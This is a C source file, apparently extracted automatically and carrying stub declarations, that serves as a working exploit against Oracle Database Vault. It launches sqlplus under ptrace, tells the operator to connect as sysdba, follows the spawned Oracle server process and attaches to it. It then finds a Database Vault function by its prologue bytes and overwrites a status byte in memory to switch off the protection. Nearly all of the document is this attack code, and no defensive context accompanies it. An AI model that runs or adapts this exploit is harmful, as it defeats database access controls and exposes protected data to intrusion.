
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct user_regs_struct {scalar_t__ orig_eax; } ;
typedef int pid_t ;
typedef int buf ;


 int ASM_DV_FUNC_PROLOG ;
 size_t EAX ;
 int PTRACE_ATTACH ;
 int PTRACE_DETACH ;
 int PTRACE_GETREGS ;
 int PTRACE_PEEKUSER ;
 int PTRACE_SYSCALL ;
 int PTRACE_TRACEME ;
 scalar_t__ WIFSTOPPED (int) ;
 scalar_t__ __NR_clone ;
 scalar_t__ __NR_execve ;
 scalar_t__ atexit (int ) ;
 int bfd_init () ;
 int child ;
 int cleanup ;
 int execl (int ,char*,char*,int *) ;
 int exit (int) ;
 int fork () ;
 int fprintf (int ,char*,...) ;
 int getdata (int,unsigned long,char*,int) ;
 int getpid () ;
 long locate_dv_func () ;
 int memcmp (unsigned char*,int ,long) ;
 int memset (unsigned char*,int ,int) ;
 int perror (char*) ;
 int ptrace (int ,int,long*,struct user_regs_struct*) ;
 int putdata (int,unsigned long,void*,int) ;
 int sqlplus ;
 int stderr ;
 long strlen (int ) ;
 int wait (int*) ;

int main(int ac, char **av)
{
 int status;
 pid_t orapid = 0;

 bfd_init();

 if((child = fork()) == -1) {
  perror("fork");
  exit(-1);
 }

 if(child == 0) {
  if(ptrace(PTRACE_TRACEME, 0, ((void*)0), ((void*)0))==-1) {
   perror("unable to ptrace(PTRACE_TRACEME)");
   exit(-1);
  }


  if(execl(sqlplus, "sqlplus", "/nolog", ((void*)0))==-1) {
   perror("execl");
   exit(-1);
  }


  exit(0);
 }

 if(atexit(cleanup) != 0) {
  fprintf(stderr, "[%d] unable to register cleanup function\n", getpid());
 }

 wait(&status);
 if(WIFSTOPPED(status)) {
  fprintf(stderr, "[%d] starting to trace sqlplus process (%d)\n", getpid(), child);
 }

 fprintf(stderr, "[***] NOW TYPE IN SQLPLUS: conn / as sysdba\n");

 while(!orapid) {
  struct user_regs_struct uregs;

  ptrace(PTRACE_SYSCALL, child, 0, 0);
  wait(&status);
  ptrace(PTRACE_GETREGS, child, 0, &uregs);


  if(uregs.orig_eax==__NR_clone) {
   long *regs = 0;


   ptrace(PTRACE_SYSCALL, child, 0, 0);
   wait(&status);
   if((orapid = ptrace(PTRACE_PEEKUSER, child, &regs[EAX], 0)) == -1) {
    perror("ptrace(PTRACE_PEEKUSER): unable to get clone() retvalue\n");
    exit(-1);
   }
   fprintf(stderr, "[%d] clone() syscall in %d, tracing orapid=%d\n", getpid(),
    child, orapid);


   if(ptrace(PTRACE_ATTACH, orapid, 0, 0) == -1) {
    perror("ptrace(PTRACE_ATTACH) to orapid");
    exit(-1);
   }

   while(1) {
    ptrace(PTRACE_SYSCALL, orapid, 0, 0);
    wait(&status);
    ptrace(PTRACE_GETREGS, orapid, 0, &uregs);
    if(uregs.orig_eax==__NR_execve) {
     fprintf(stderr, "[%d] execve() syscall in %d, \n", getpid(), orapid);

     ptrace(PTRACE_SYSCALL, orapid, 0, 0);
     break;
    } else {

     ptrace(PTRACE_SYSCALL, orapid, 0, 0);
    }
   }

   if(ptrace(PTRACE_DETACH, child, 0, 0) == -1) {
    perror("ptrace(PTRACE_DETACH) from child");
    exit(-1);
   }

  } else if(uregs.orig_eax==__NR_execve) {
   fprintf(stderr, "[%d] execve() syscall in %d\n", getpid(), child);
  }
 }


 long dv_func = locate_dv_func();
 if(dv_func == 0) {
  fprintf(stderr, "ERROR: unable to find function\n");
  exit(-1);
 }
 wait(&status);

 unsigned char buf[32];
 memset(buf, 0, sizeof(buf));
 getdata(orapid, dv_func, (char *)&buf, 32);







 if(!memcmp(buf, ASM_DV_FUNC_PROLOG, strlen(ASM_DV_FUNC_PROLOG))) {
  unsigned char dv_status;
  unsigned long woff = dv_func + strlen(ASM_DV_FUNC_PROLOG), woff2=woff;

  getdata(orapid, woff, (char *)&dv_status, 1);
  fprintf(stderr, "[***] sucessfuly validated function, DatabaseVault=%d\n", dv_status);
  fprintf(stderr, "[***] attempting to rewrite memory at 0x%lx\n", woff2);

  unsigned char my = 0;
  putdata(orapid, woff2, (void *)&my, 1);
 }

 if(ptrace(PTRACE_DETACH, orapid, 0, 0) == -1) {
  perror("ptrace(PTRACE_DETACH) from orapid");
  exit(-1);
 }

 wait(&status);
 exit(0);
}
